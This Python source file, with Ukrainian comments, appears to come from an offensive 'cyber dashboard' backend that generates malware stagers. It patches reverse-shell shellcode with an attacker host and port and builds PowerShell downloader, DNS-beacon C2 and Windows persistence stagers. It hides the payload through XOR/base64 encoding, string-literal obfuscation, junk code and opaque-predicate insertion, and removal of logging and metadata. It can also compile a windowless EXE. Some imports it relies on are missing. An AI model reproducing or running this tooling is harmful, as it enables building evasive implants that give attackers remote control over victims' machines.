# File: CYBER_DASHBOARD_BACKEND/payload_generator/logic.py
# Координатор: Синтаксис
# Опис: Додано обробку параметрів enable_stager_logging та strip_stager_metadata.
# Реалізовано видалення логування та метаданих з коду стейджера.

import json
import base64
import re
import os 
import tempfile 
import subprocess 
import shlex 
import shutil # Забезпечено наявність імпорту
from datetime import datetime 

import config 
from utils import (
    xor_cipher, 
    b64_encode_str, 
    # b64_decode_str, # Не використовується в цьому файлі напряму
    generate_random_var_name
)
from .stager_templates import generate_stager_code_logic

def patch_shellcode_logic(shellcode_hex: str, lhost_str: str, lport_int: int, log_messages: list) -> str:
    # ... (існуюча логіка залишається без змін) ...
    log_messages.append(f"[SHELLCODE_PATCH_LOGIC] Початок патчингу шеллкоду. LHOST: {lhost_str}, LPORT: {lport_int}")
    patched_shellcode_hex = shellcode_hex
    
    lhost_placeholder_fixed_hex = "DEADBEEF" 
    if lhost_placeholder_fixed_hex in patched_shellcode_hex:
        try:
            ip_addr_bytes = ipaddress.ip_address(lhost_str).packed # Потребує import ipaddress
            ip_addr_hex = ip_addr_bytes.hex()
            if len(ip_addr_hex) == 8:
                patched_shellcode_hex = patched_shellcode_hex.replace(lhost_placeholder_fixed_hex, ip_addr_hex)
                log_messages.append(f"[SHELLCODE_PATCH_LOGIC_SUCCESS] LHOST '{lhost_placeholder_fixed_hex}' замінено на '{ip_addr_hex}'.")
            else:
                log_messages.append(f"[SHELLCODE_PATCH_LOGIC_WARN] Не вдалося підготувати LHOST для заміни (неправильна довжина IP hex: {len(ip_addr_hex)}). Очікувалось 8 символів.")
        except ValueError:
            log_messages.append(f"[SHELLCODE_PATCH_LOGIC_ERROR] Невірний формат LHOST: {lhost_str}.")
        except Exception as e:
            log_messages.append(f"[SHELLCODE_PATCH_LOGIC_ERROR] Помилка під час патчингу LHOST: {str(e)}.")
    else:
        log_messages.append(f"[SHELLCODE_PATCH_LOGIC_INFO] Стандартний 4-байтовий заповнювач LHOST ('{lhost_placeholder_fixed_hex}') не знайдено в шеллкоді.")

    lport_placeholder_fixed_hex = "CAFE"
    if lport_placeholder_fixed_hex in patched_shellcode_hex:
        try:
            lport_bytes = lport_int.to_bytes(2, byteorder='little') 
            lport_hex_final = lport_bytes.hex()
            
            if len(lport_hex_final) == 4:
                patched_shellcode_hex = patched_shellcode_hex.replace(lport_placeholder_fixed_hex, lport_hex_final)
                log_messages.append(f"[SHELLCODE_PATCH_LOGIC_SUCCESS] LPORT '{lport_placeholder_fixed_hex}' замінено на '{lport_hex_final}' (little-endian).")
            else:
                log_messages.append(f"[SHELLCODE_PATCH_LOGIC_WARN] Не вдалося підготувати LPORT для заміни (неправильна довжина LPORT hex: {len(lport_hex_final)}). Очікувалось 4 символи.")
        except Exception as e:
            log_messages.append(f"[SHELLCODE_PATCH_LOGIC_ERROR] Помилка під час патчингу LPORT: {str(e)}.")
    else:
        log_messages.append(f"[SHELLCODE_PATCH_LOGIC_INFO] Стандартний 2-байтовий заповнювач LPORT ('{lport_placeholder_fixed_hex}') не знайдено в шеллкоді.")

    if patched_shellcode_hex == shellcode_hex:
        log_messages.append("[SHELLCODE_PATCH_LOGIC_INFO] Шеллкод не було змінено (заповнювачі не знайдено або виникли помилки під час заміни).")
    return patched_shellcode_hex


def validate_payload_parameters_logic(input_params: dict) -> tuple[bool, dict, list[str]]:
    # ... (існуюча логіка залишається без змін, але переконайтеся, що нові параметри обробляються) ...
    # Важливо, щоб CONCEPTUAL_PARAMS_SCHEMA_BE у config.py містив визначення для
    # "enable_stager_logging" та "strip_stager_metadata"
    schema = config.CONCEPTUAL_PARAMS_SCHEMA_BE
    validated_params = {}
    errors = []
    
    # Заповнення дефолтними значеннями та конвертація типів
    for param_name, rules in schema.items():
        if param_name in input_params:
            value_to_validate = input_params[param_name]
            # Конвертація для булевих значень, якщо вони приходять як рядки з JSON
            if rules.get("type") == bool and isinstance(value_to_validate, str):
                if value_to_validate.lower() == 'true': value_to_validate = True
                elif value_to_validate.lower() == 'false': value_to_validate = False
            elif rules.get("type") == int and not isinstance(value_to_validate, int):
                try: value_to_validate = int(str(value_to_validate))
                except (ValueError, TypeError): pass 
            validated_params[param_name] = value_to_validate
        elif "default" in rules:
             # Перевірка, чи умовно обов'язковий параметр не відсутній без дефолту
            is_cond_req_missing = False
            if callable(rules.get("required")):
                # Для перевірки умовних required, передаємо поточний стан параметрів
                # Це може бути складним, якщо умови залежать від інших ще не валідованих параметрів.
                # Поки що припускаємо, що умови required прості.
                if rules["required"](input_params) and param_name not in input_params: 
                    is_cond_req_missing = True
            if not is_cond_req_missing:
                validated_params[param_name] = rules["default"]

    # Основна валідація
    for param_name, rules in schema.items():
        is_required_directly = rules.get("required") is True
        # Для умовного required, використовуємо вже частково заповнений validated_params
        current_params_for_cond_check = {**input_params, **validated_params} 
        is_conditionally_required = callable(rules.get("required")) and rules["required"](current_params_for_cond_check)

        if (is_required_directly or is_conditionally_required) and param_name not in validated_params:
            errors.append(f"Відсутній обов'язковий параметр: '{param_name}'.")
            continue 

        if param_name in validated_params:
            value = validated_params[param_name]
            if "type" in rules and not isinstance(value, rules["type"]):
                # Дозволяємо булевим значенням бути рядками "true"/"false" на вході,
                # але після конвертації вони мають бути bool.
                # Ця перевірка тут може бути зайвою, якщо конвертація вище спрацювала.
                if not (rules.get("type") == bool and isinstance(value, str) and value.lower() in ['true', 'false']):
                    errors.append(f"Параметр '{param_name}' має невірний тип. Очікується {rules['type'].__name__}, отримано {type(value).__name__}.")
                    continue 
            if "allowed_values" in rules and value not in rules["allowed_values"]:
                errors.append(f"Значення '{value}' для параметра '{param_name}' не є дозволеним. Дозволені: {rules['allowed_values']}.")
            if "min_length" in rules and isinstance(value, str) and len(value) < rules["min_length"]:
                 errors.append(f"Параметр '{param_name}' закороткий. Мін. довжина: {rules['min_length']}.")
            if "allowed_range" in rules and rules.get("type") in [int, float]: 
                min_val, max_val = rules["allowed_range"]
                if not (min_val <= value <= max_val):
                    errors.append(f"Значення '{value}' для параметра '{param_name}' виходить за межі ({min_val}-{max_val}).")
            if "validation_regex" in rules and rules.get("type") is str: 
                if not re.match(rules["validation_regex"], value):
                    errors.append(f"Значення '{value}' для параметра '{param_name}' не відповідає формату: {rules['validation_regex']}.")
    return not errors, validated_params, errors


def obfuscate_string_literals_in_python_code_logic(code: str, key: str, log_messages: list) -> str:
    # ... (існуюча логіка залишається без змін) ...
    string_literal_regex = r"""(?<![a-zA-Z0-9_])(?:u?r?(?:\"\"\"([^\"\\]*(?:\\.[^\"\\]*)*)\"\"\"|'''([^'\\]*(?:\\.[^'\\]*)*)'''|\"([^\"\\]*(?:\\.[^\"\\]*)*)\"|'([^'\\]*(?:\\.[^'\\]*)*)'))"""
    found_literals_matches = list(re.finditer(string_literal_regex, code, re.VERBOSE))
    if not found_literals_matches:
        log_messages.append("[METAMORPH_LOGIC_INFO] Рядкових літералів для обфускації не знайдено.")
        return code

    # Визначаємо ім'я функції декодера один раз
    # Переконайтеся, що OBFUSCATION_KEY_EMBEDDED доступна в області видимості, де буде викликатися ця функція
    decoder_func_name = generate_random_var_name(prefix="unveil_str_") 
    decoder_func_code = f"""
import base64 as b64_rt_decoder_local_{decoder_func_name} 
def {decoder_func_name}(s_b64, k_s): # k_s - це ключ, який має бути доступний
    try:
        d_b = b64_rt_decoder_local_{decoder_func_name}.b64decode(s_b64.encode('utf-8')) 
        d_s = d_b.decode('latin-1') 
        o_c = [] 
        for i_c in range(len(d_s)): 
            o_c.append(chr(ord(d_s[i_c]) ^ ord(k_s[i_c % len(k_s)])))
        return "".join(o_c) 
    except Exception: return s_b64 
"""
    obfuscated_count = 0
    definitions_to_add = [] 
    replacements = [] 

    # Ключові слова та ідентифікатори, які не слід обфускувати
    # Додаємо імена мета-змінних, щоб їх не обфускувати
    python_keywords = config.CONCEPTUAL_PARAMS_SCHEMA_BE.get("payload_archetype", {}).get("allowed_values", []) + \
                      ["False", "None", "True", "and", "as", "assert", "async", "await", "break", "class", 
                       "continue", "def", "del", "elif", "else", "except", "finally", "for", "from", 
                       "global", "if", "import", "in", "is", "lambda", "nonlocal", "not", "or", "pass", 
                       "raise", "return", "try", "while", "with", "yield", "__main__", "__name__",
                       "OBFUSCATION_KEY_EMBEDDED", "OBF_DATA_B64", 
                       "METAMORPHISM_APPLIED_META", "EVASION_CHECKS_APPLIED_META", 
                       "AMSI_BYPASS_CONCEPT_APPLIED_META", "DISK_SIZE_CHECK_APPLIED_META",
                       "STAGER_LOGGING_ENABLED_META", # Нова мета-змінна
                       "POWERSHELL_EXEC_ARGS_META", "STAGER_IMPLANT_ID_META", 
                       "BEACON_INTERVAL_SEC_META", "DNS_BEACON_SUBDOMAIN_PREFIX_META", 
                       "DNS_BEACON_INTERVAL_SEC_META", "STAGER_DEBUG_MODE" # Прапорець логування
                       ]


    for match in found_literals_matches:
        literal_group = next(g for g in match.groups() if g is not None) 
        full_match_str = match.group(0) 
        
        if len(literal_group) < 3 or literal_group in python_keywords or literal_group.isidentifier() or \
           '{' in literal_group or '}' in literal_group or '%' in literal_group or \
           full_match_str.startswith("f\"") or full_match_str.startswith("f'") or \
           literal_group.startswith("unveil_") or literal_group.startswith("dx_runtime") or \
           literal_group.startswith("ec_runtime") or literal_group.startswith("ex_runtime") or \
           literal_group == "stager_log": # Не обфускуємо ім'я функції логування
            continue

        obfuscated_s_xor = xor_cipher(literal_group, key)
        obfuscated_s_b64 = b64_encode_str(obfuscated_s_xor)
        var_name = generate_random_var_name(prefix="obf_lit_") 
        # Передаємо OBFUSCATION_KEY_EMBEDDED як аргумент
        definitions_to_add.append(f"{var_name} = {decoder_func_name}(\"{obfuscated_s_b64}\", OBFUSCATION_KEY_EMBEDDED)") 
        replacements.append((match.span(), var_name)) 
        obfuscated_count +=1

    if obfuscated_count > 0:
        import_lines_end_pos = 0
        last_import_match = None
        for match_imp in re.finditer(r"^(?:from\s+\S+\s+import\s+\S+|import\s+\S+)(?:.*?)(?:\n|$)", code, re.MULTILINE):
            last_import_match = match_imp
        if last_import_match:
            import_lines_end_pos = last_import_match.end()
        else: 
            first_code_line_match = re.search(r"^(?!\s*#)", code, re.MULTILINE)
            import_lines_end_pos = first_code_line_match.start() if first_code_line_match else 0

        code_before_insertion = code[:import_lines_end_pos]
        code_after_insertion_point = code[import_lines_end_pos:]

        all_definitions_code = "\n" + decoder_func_code + "\n" + "\n".join(definitions_to_add) + "\n"
        
        temp_main_logic = code_after_insertion_point
        for (start_orig, end_orig), var_name_rep in sorted(replacements, key=lambda x: x[0][0], reverse=True):
            start_rel = start_orig - import_lines_end_pos
            end_rel = end_orig - import_lines_end_pos
            if start_rel >= 0 and end_rel <= len(temp_main_logic):
                 temp_main_logic = temp_main_logic[:start_rel] + var_name_rep + temp_main_logic[end_rel:]

        modified_code = code_before_insertion + all_definitions_code + temp_main_logic
        log_messages.append(f"[METAMORPH_LOGIC_INFO] Обфусковано {obfuscated_count} рядкових літералів. Функція-декодер: {decoder_func_name}")
    else:
        log_messages.append("[METAMORPH_LOGIC_INFO] Рядкових літералів для обфускації не знайдено (після фільтрації).")
        modified_code = code 
    return modified_code


def apply_advanced_cfo_logic(code_lines: list, log_messages: list) -> str:
    # ... (існуюча логіка залишається без змін) ...
    transformed_code_list = []
    cfo_applied_count = 0
    junk_code_count = 0

    for line_idx, line in enumerate(code_lines):
        transformed_code_list.append(line) 
        current_indent = line[:len(line) - len(line.lstrip())] 

        if random.random() < 0.15 and line.strip() and not line.strip().startswith("#") and len(line.strip()) > 3 : 
            junk_var1 = generate_random_var_name(prefix="jnk_var_")
            junk_var2 = generate_random_var_name(prefix="tmp_dat_")
            junk_ops = [
                f"{current_indent}{junk_var1} = {random.randint(1000, 9999)} * {random.randint(1,10)} # Junk arithmetics {random.randint(0,100)}",
                f"{current_indent}{junk_var2} = list(range({random.randint(1,3)})) # Junk list op {random.randint(0,100)}",
                f"{current_indent}# Junk comment {generate_random_var_name(15, '')}",
                f"{current_indent}if {random.choice([True, False])}: pass # Simple junk if"
            ]
            transformed_code_list.append(random.choice(junk_ops))
            junk_code_count +=1
        
        excluded_cfo_lines_start = ("OBFUSCATION_KEY_EMBEDDED", "OBF_DATA_B64", 
                                    "METAMORPHISM_APPLIED_META", "EVASION_CHECKS_APPLIED_META", 
                                    "AMSI_BYPASS_CONCEPT_APPLIED_META", "DISK_SIZE_CHECK_APPLIED_META",
                                    "STAGER_LOGGING_ENABLED_META", "POWERSHELL_EXEC_ARGS_META", 
                                    "STAGER_IMPLANT_ID_META", "BEACON_INTERVAL_SEC_META",
                                    "DNS_BEACON_SUBDOMAIN_PREFIX_META", "DNS_BEACON_INTERVAL_SEC_META",
                                    "STAGER_DEBUG_MODE") # Додано нові мета-змінні

        if random.random() < 0.25 and line.strip() and \
           not line.strip().startswith("#") and \
           "def " not in line and "class " not in line and \
           "if __name__" not in line and "import " not in line and \
           "return " not in line and not line.strip().endswith(":") and \
           not any(line.strip().startswith(ex_start) for ex_start in excluded_cfo_lines_start):

            r1, r2 = random.randint(1,100), random.randint(1,100)
            cfo_type = random.randint(1, 6) 
            cfo_block_lines = [f"{current_indent}# --- CFO Block Type {cfo_type} Inserted ---"]

            if cfo_type == 1: 
                cfo_block_lines.append(f"{current_indent}if {r1} * {random.randint(1,5)} > {r1-1000}: # Opaque True {random.randint(0,100)}")
                cfo_block_lines.append(f"{current_indent}    {generate_random_var_name(prefix='cfo_v1_')} = {r1} ^ {r2}")
                cfo_block_lines.append(f"{current_indent}else:")
                cfo_block_lines.append(f"{current_indent}    {generate_random_var_name(prefix='dead1_')} = {r1}+{r2} # Dead code")
            elif cfo_type == 2: 
                cfo_block_lines.append(f"{current_indent}if str({r1}) == str({r1 + 1}): # Opaque False {random.randint(0,100)}")
                cfo_block_lines.append(f"{current_indent}    {generate_random_var_name(prefix='dead2_')} = {r1}-{r2} # Dead code")
                cfo_block_lines.append(f"{current_indent}else:")
                cfo_block_lines.append(f"{current_indent}    {generate_random_var_name(prefix='cfo_v2_')} = {r2} | {r1}")
            elif cfo_type == 3: 
                loop_var = generate_random_var_name(1, '_lp')
                cfo_block_lines.append(f"{current_indent}for {loop_var} in range({random.randint(1,3)}): # Junk Loop {random.randint(0,100)}")
                cfo_block_lines.append(f"{current_indent}    {generate_random_var_name(prefix='iter_jnk_')} = str({loop_var} * {r1}) + \"_{r2}\"")
                cfo_block_lines.append(f"{current_indent}    if {loop_var} > 5: break # Unlikely break")
            elif cfo_type == 4: 
                v_a, v_b = generate_random_var_name(prefix="cfa_op_"), generate_random_var_name(prefix="cfb_op_")
                cfo_block_lines.append(f"{current_indent}{v_a} = ({r1} << {random.randint(0,2)}) + {random.randint(0,10)}")
                cfo_block_lines.append(f"{current_indent}{v_b} = {v_a} ^ {r2 if r2 !=0 else 1}") 
                cfo_block_lines.append(f"{current_indent}if {v_b} % ({r2 if r2 !=0 else 1}) != {v_a} % ({r2 if r2 !=0 else 1}): # Opaque True (complex) {random.randint(0,100)}")
                cfo_block_lines.append(f"{current_indent}    pass")
            elif cfo_type == 5: 
                cfo_block_lines.append(f"{current_indent}if True: # Outer always true {random.randint(0,100)}")
                cfo_block_lines.append(f"{current_indent}    if {r1} < {r1 // 2 if r1 > 0 else -1}: # Inner likely false")
                cfo_block_lines.append(f"{current_indent}        {generate_random_var_name(prefix='dead_path_')} = 'unreachable'")
                cfo_block_lines.append(f"{current_indent}    else:")
                cfo_block_lines.append(f"{current_indent}        pass # Real path")
            elif cfo_type == 6: 
                 func_name_cfo = generate_random_var_name(prefix="cfo_sub_")
                 sub_var_name_cfo = generate_random_var_name(prefix='sub_var_')
                 cfo_block_lines.append(f"{current_indent}def {func_name_cfo}():")
                 cfo_block_lines.append(f"{current_indent}    {sub_var_name_cfo} = {r1}%({r2 if r2!=0 else 1})")
                 cfo_block_lines.append(f"{current_indent}    return {sub_var_name_cfo}")
                 cfo_block_lines.append(f"{current_indent}{generate_random_var_name(prefix='res_')} = {func_name_cfo}()")

            cfo_block_lines.append(f"\n{current_indent}# --- CFO Block End {random.randint(0,100)} ---")
            transformed_code_list.extend(cfo_block_lines)
            cfo_applied_count +=1

    log_messages.append(f"[METAMORPH_LOGIC_DEBUG] Застосовано CFO блоків: {cfo_applied_count}, Сміттєвого коду: {junk_code_count}.")
    return "\n".join(transformed_code_list)


def handle_payload_generation_logic(request_data: dict, log_messages_main: list) -> tuple[dict, int]:
    """
    Обробляє запит на генерацію пейлоада.
    Враховує нові параметри enable_stager_logging та strip_stager_metadata.
    """
    log_messages = list(log_messages_main) 
    log_messages.append(f"[PAYLOAD_LOGIC_INFO] Початок обробки генерації пейлоада о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}.")

    if not request_data:
        log_messages.append("[PAYLOAD_LOGIC_ERROR] Не отримано JSON даних у запиті.")
        return {"success": False, "error": "No JSON data in request", "generationLog": "\n".join(log_messages)}, 400

    log_messages.append(f"[PAYLOAD_LOGIC_INFO] Вхідні параметри: {json.dumps(request_data, indent=2, ensure_ascii=False)}")
    
    is_valid, validated_params, errors = validate_payload_parameters_logic(request_data)
    if not is_valid:
        log_messages.append(f"[PAYLOAD_LOGIC_VALIDATION_FAILURE] Помилки валідації: {errors}")
        return {"success": False, "error": "Validation failed", "errors": errors, "generationLog": "\n".join(log_messages)}, 400

    log_messages.append("[PAYLOAD_LOGIC_VALIDATION_SUCCESS] Валідація параметрів успішна.")
    archetype_name = validated_params.get("payload_archetype")
    archetype_details = config.CONCEPTUAL_ARCHETYPE_TEMPLATES_BE.get(archetype_name)
    if not archetype_details:
        log_messages.append(f"[PAYLOAD_LOGIC_ERROR] Невідомий архетип: {archetype_name}")
        return {"success": False, "error": f"Unknown archetype: {archetype_name}", "generationLog": "\n".join(log_messages)}, 400
        
    log_messages.append(f"[PAYLOAD_LOGIC_ARCHETYPE_INFO] Архетип: {archetype_name} - {archetype_details['description']}")

    data_to_process_for_stager = {}
    # ... (логіка заповнення data_to_process_for_stager залишається без змін) ...
    if archetype_name == "demo_echo_payload":
        data_to_process_for_stager['message'] = validated_params.get("message_to_echo", "Default Echo Message")
    elif archetype_name == "demo_file_lister_payload":
        data_to_process_for_stager['directory'] = validated_params.get("directory_to_list", ".")
    elif archetype_name == "demo_c2_beacon_payload":
        data_to_process_for_stager['c2_url'] = validated_params.get("c2_beacon_endpoint")
    elif archetype_name in ["reverse_shell_tcp_shellcode_windows_x64", "reverse_shell_tcp_shellcode_linux_x64"]:
        shellcode_hex_input = validated_params.get("shellcode_hex_placeholder")
        lhost_for_patch = validated_params.get("c2_target_host")
        lport_for_patch = validated_params.get("c2_target_port")
        # Потрібно додати import ipaddress у patch_shellcode_logic або тут
        import ipaddress # Тимчасово тут, краще перенести вгору файлу або в utils
        log_messages.append(f"[PAYLOAD_LOGIC_SHELLCODE_PREP] LHOST: {lhost_for_patch}, LPORT: {lport_for_patch} для патчингу шеллкоду.")
        data_to_process_for_stager['shellcode'] = patch_shellcode_logic(shellcode_hex_input, lhost_for_patch, lport_for_patch, log_messages)
    elif archetype_name == "powershell_downloader_stager":
        data_to_process_for_stager['ps_url'] = validated_params.get("powershell_script_url")
    elif archetype_name == "dns_beacon_c2_concept":
        data_to_process_for_stager['dns_zone'] = validated_params.get("c2_dns_zone")
    elif archetype_name == "windows_simple_persistence_stager":
        data_to_process_for_stager['persistence_method'] = validated_params.get("persistence_method")
        data_to_process_for_stager['command_to_persist'] = validated_params.get("command_to_persist")
        data_to_process_for_stager['artifact_name'] = validated_params.get("artifact_name")


    key = validated_params.get("obfuscation_key", "DefaultFrameworkKey")
    obfuscated_payload_params_json = json.dumps(data_to_process_for_stager) 
    log_messages.append(f"[PAYLOAD_LOGIC_OBF_INFO] Обфускація параметрів для стейджера: '{obfuscated_payload_params_json[:100]}...' з ключем '{key}'.")
    obfuscated_data_raw = xor_cipher(obfuscated_payload_params_json, key)
    obfuscated_data_b64 = b64_encode_str(obfuscated_data_raw)
    log_messages.append(f"[PAYLOAD_LOGIC_OBF_SUCCESS] Дані обфусковано: {obfuscated_data_b64[:40]}...")

    log_messages.append(f"[PAYLOAD_LOGIC_STAGER_GEN_INFO] Генерація коду стейджера...")
    
    stager_code_raw = generate_stager_code_logic(
        archetype_name=archetype_name,
        obfuscation_key=key,
        obfuscated_data_b64=obfuscated_data_b64,
        validated_params=validated_params, # Передаємо всі валідовані параметри
        log_messages=log_messages
    )

    # Постобробка стейджера на основі нових параметрів
    enable_logging = validated_params.get('enable_stager_logging', False)
    strip_metadata = validated_params.get('strip_stager_metadata', True)

    if not enable_logging:
        log_messages.append("[PAYLOAD_LOGIC_POSTPROCESS] Видалення логування зі стейджера...")
        # Видалення визначення функції stager_log та всіх її викликів
        stager_code_raw = re.sub(r"def stager_log\(.*?\):(?:\s*#.*)?\n(?:\s{4}if STAGER_DEBUG_MODE:\n\s{8}print\(.*?\)\n?)?", "", stager_code_raw, flags=re.DOTALL)
        stager_code_raw = re.sub(r"stager_log\(.*?\)\n?", "", stager_code_raw)
        # Також видаляємо STAGER_DEBUG_MODE, якщо він більше не потрібен
        stager_code_raw = re.sub(r"STAGER_DEBUG_MODE = (?:True|False)\n?", "", stager_code_raw)
        log_messages.append("[PAYLOAD_LOGIC_POSTPROCESS] Логування видалено.")

    if strip_metadata:
        log_messages.append("[PAYLOAD_LOGIC_POSTPROCESS] Видалення метаданих та коментарів зі стейджера...")
        lines = stager_code_raw.splitlines()
        processed_lines = []
        for line in lines:
            stripped_line = line.strip()
            # Видалення коментарів, що починаються з # SYNTAX, # Timestamp, # Archetype
            # та рядків, що визначають мета-змінні (закінчуються на _META)
            if stripped_line.startswith(("# SYNTAX", "# Timestamp", "# Archetype")) or \
               re.match(r"^[A-Z_0-9]+_META\s*=\s*.*", stripped_line):
                continue
            processed_lines.append(line)
        stager_code_raw = "\n".join(processed_lines)
        log_messages.append("[PAYLOAD_LOGIC_POSTPROCESS] Метадані та коментарі видалено.")


    if validated_params.get('enable_stager_metamorphism', False):
        log_messages.append("[PAYLOAD_LOGIC_METAMORPH_INFO] Застосування розширеного метаморфізму до Python-стейджера...")
        stager_code_raw_for_metamorph = stager_code_raw # Тепер працюємо з потенційно очищеним кодом
        stager_code_raw_for_metamorph = obfuscate_string_literals_in_python_code_logic(stager_code_raw_for_metamorph, key, log_messages)
        stager_code_raw_list_for_cfo = stager_code_raw_for_metamorph.splitlines()
        stager_code_raw_for_metamorph = apply_advanced_cfo_logic(stager_code_raw_list_for_cfo, log_messages)
        
        decode_func_name_runtime_orig = "dx_runtime" 
        evasion_func_name_runtime_orig = "ec_runtime"
        execute_func_name_runtime_orig = "ex_runtime"

        unveil_match = re.search(r"def\s+(unveil_str_\w+)\(", stager_code_raw_for_metamorph) 
        final_unveil_name_obf_strings = unveil_match.group(1) if unveil_match else None

        final_decode_name_runtime = generate_random_var_name(prefix="unveil_rt_") 
        final_evasion_name_runtime = generate_random_var_name(prefix="audit_rt_") 
        final_execute_name_runtime = generate_random_var_name(prefix="dispatch_rt_") 

        stager_code_raw_for_metamorph = re.sub(rf"\b{decode_func_name_runtime_orig}\b", final_decode_name_runtime, stager_code_raw_for_metamorph)
        stager_code_raw_for_metamorph = re.sub(rf"\b{evasion_func_name_runtime_orig}\b", final_evasion_name_runtime, stager_code_raw_for_metamorph)
        stager_code_raw_for_metamorph = re.sub(rf"\b{execute_func_name_runtime_orig}\b", final_execute_name_runtime, stager_code_raw_for_metamorph)
        
        if final_unveil_name_obf_strings: 
            new_unveil_for_obf_strings_renamed = generate_random_var_name(prefix="reveal_lit_") 
            stager_code_raw_for_metamorph = re.sub(rf"\b{final_unveil_name_obf_strings}\b", new_unveil_for_obf_strings_renamed, stager_code_raw_for_metamorph)
            log_messages.append(f"[PAYLOAD_LOGIC_METAMORPH_SUCCESS] Метаморфізм застосовано (ключові функції: {new_unveil_for_obf_strings_renamed}, {final_decode_name_runtime}, {final_evasion_name_runtime}, {final_execute_name_runtime}).")
        else:
            log_messages.append(f"[PAYLOAD_LOGIC_METAMORPH_SUCCESS] Метаморфізм застосовано (ключові функції: {final_decode_name_runtime}, {final_evasion_name_runtime}, {final_execute_name_runtime}). Функцію обфускації рядків не знайдено для перейменування.")
        stager_code_raw = stager_code_raw_for_metamorph

    output_format = validated_params.get("output_format")
    final_stager_output = ""

    if output_format == "pyinstaller_exe_windows":
        # ... (існуюча логіка PyInstaller залишається без змін, але працює з фінальним stager_code_raw) ...
        log_messages.append("[PAYLOAD_LOGIC_PYINSTALLER_INFO] Обрано формат PyInstaller EXE.")
        pyinstaller_path = shutil.which("pyinstaller") 
        if not pyinstaller_path:
            log_messages.append("[PAYLOAD_LOGIC_PYINSTALLER_ERROR] PyInstaller не знайдено в системному PATH. Повернення Base64 Python-коду.")
            final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
            log_messages.append("\n[ПРИМІТКА] PyInstaller не знайдено. Повернений Base64 представляє Python-код стейджера.")
        else:
            log_messages.append(f"[PAYLOAD_LOGIC_PYINSTALLER_INFO] PyInstaller знайдено: {pyinstaller_path}")
            pyinstaller_options_str = validated_params.get("pyinstaller_options", "--onefile --noconsole")
            pyinstaller_options = shlex.split(pyinstaller_options_str)
            with tempfile.TemporaryDirectory() as tmpdir:
                log_messages.append(f"[PAYLOAD_LOGIC_PYINSTALLER_INFO] Створено тимчасову директорію: {tmpdir}")
                temp_py_filename = os.path.join(tmpdir, "stager_to_compile.py")
                with open(temp_py_filename, "w", encoding="utf-8") as f:
                    f.write(stager_code_raw)
                log_messages.append(f"[PAYLOAD_LOGIC_PYINSTALLER_INFO] Python-стейджер збережено у: {temp_py_filename}")
                
                base_script_name = os.path.splitext(os.path.basename(temp_py_filename))[0]
                dist_path = os.path.join(tmpdir, "dist")
                work_path = os.path.join(tmpdir, "build")

                pyinstaller_cmd = [
                    pyinstaller_path, *pyinstaller_options,
                    "--distpath", dist_path, "--workpath", work_path,
                    "--specpath", tmpdir, temp_py_filename
                ]
                log_messages.append(f"[PAYLOAD_LOGIC_PYINSTALLER_INFO] Запуск PyInstaller: {' '.join(pyinstaller_cmd)}")
                try:
                    compile_process = subprocess.run(pyinstaller_cmd, capture_output=True, text=True, check=False, timeout=300)
                    log_messages.append(f"[PAYLOAD_LOGIC_PYINSTALLER_STDOUT] {compile_process.stdout}")
                    if compile_process.returncode != 0:
                        log_messages.append(f"[PAYLOAD_LOGIC_PYINSTALLER_ERROR] Помилка PyInstaller (код: {compile_process.returncode}): {compile_process.stderr}")
                        final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
                        log_messages.append("\n[ПРИМІТКА] Помилка компіляції PyInstaller. Повернений Base64 представляє Python-код стейджера.")
                    else:
                        compiled_exe_path = os.path.join(dist_path, base_script_name + ".exe")
                        if os.path.exists(compiled_exe_path):
                            log_messages.append(f"[PAYLOAD_LOGIC_PYINSTALLER_SUCCESS] .EXE файл успішно створено: {compiled_exe_path}")
                            with open(compiled_exe_path, "rb") as f_exe:
                                exe_bytes = f_exe.read()
                            final_stager_output = base64.b64encode(exe_bytes).decode('utf-8')
                            log_messages.append(f"[PAYLOAD_LOGIC_PYINSTALLER_INFO] .EXE файл закодовано в Base64 (довжина: {len(final_stager_output)}).")
                        else:
                            log_messages.append(f"[PAYLOAD_LOGIC_PYINSTALLER_ERROR] .EXE файл не знайдено у {dist_path} після компіляції.")
                            final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
                            log_messages.append("\n[ПРИМІТКА] .EXE файл не знайдено. Повернений Base64 представляє Python-код стейджера.")
                except subprocess.TimeoutExpired:
                    log_messages.append("[PAYLOAD_LOGIC_PYINSTALLER_ERROR] Час очікування PyInstaller вичерпано.")
                    final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
                    log_messages.append("\n[ПРИМІТКА] Таймаут PyInstaller. Повернений Base64 представляє Python-код стейджера.")
                except Exception as e_pyinst:
                    log_messages.append(f"[PAYLOAD_LOGIC_PYINSTALLER_FATAL] Непередбачена помилка під час компіляції PyInstaller: {str(e_pyinst)}")
                    final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
                    log_messages.append("\n[ПРИМІТКА] Непередбачена помилка PyInstaller. Повернений Base64 представляє Python-код стейджера.")
            log_messages.append(f"[PAYLOAD_LOGIC_PYINSTALLER_INFO] Тимчасову директорію {tmpdir} (має бути) видалено.")

    elif output_format == "base64_encoded_stager":
        final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
        log_messages.append("[PAYLOAD_LOGIC_FORMAT_INFO] Стейджер Base64.")
    else: 
        final_stager_output = stager_code_raw
        log_messages.append("[PAYLOAD_LOGIC_FORMAT_INFO] Raw Python Стейджер.")

    log_messages.append("[PAYLOAD_LOGIC_SUCCESS] Пейлоад згенеровано.")
    return {"success": True, "stagerCode": final_stager_output, "generationLog": "\n".join(log_messages)}, 200
